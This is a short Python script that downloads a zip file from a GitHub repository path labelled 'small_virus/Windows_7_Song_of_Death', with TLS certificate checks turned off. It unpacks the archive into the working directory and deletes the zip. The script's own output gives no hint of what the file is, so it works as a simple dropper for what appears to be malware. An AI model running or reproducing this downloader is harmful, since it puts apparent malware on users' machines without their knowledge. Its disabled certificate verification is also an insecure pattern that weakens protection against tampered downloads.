import requests
from tqdm import tqdm
import zipfile
import os

def download_file(url, output_path):
    response = requests.get(url, stream=True, verify=False)
    total_size = int(response.headers.get('content-length', 0))
    block_size = 1024  # 1 Kibibyte

    with open(output_path, 'wb') as file, tqdm(
        desc=output_path,
        total=total_size,
        unit='iB',
        unit_scale=True,
        unit_divisor=1024,
    ) as bar:
        for data in response.iter_content(block_size):
            bar.update(len(data))
            file.write(data)

def extract_zip(file_path, extract_to='.'):
    with zipfile.ZipFile(file_path, 'r') as zip_ref:
        zip_ref.extractall(extract_to)

def main():
    url = 'https://github.com/huluobuo/filesss-huluobuo/raw/refs/heads/main/small_virus/Windows_7_Song_of_Death/error.zip'
    output_path = 'error.zip'

    print("Downloading file...")
    download_file(url, output_path)

    print("Extracting file...")
    extract_zip(output_path)

    # Optionally, remove the zip file after extraction
    os.remove(output_path)
    print("Done.")

if __name__ == "__main__":
    main()
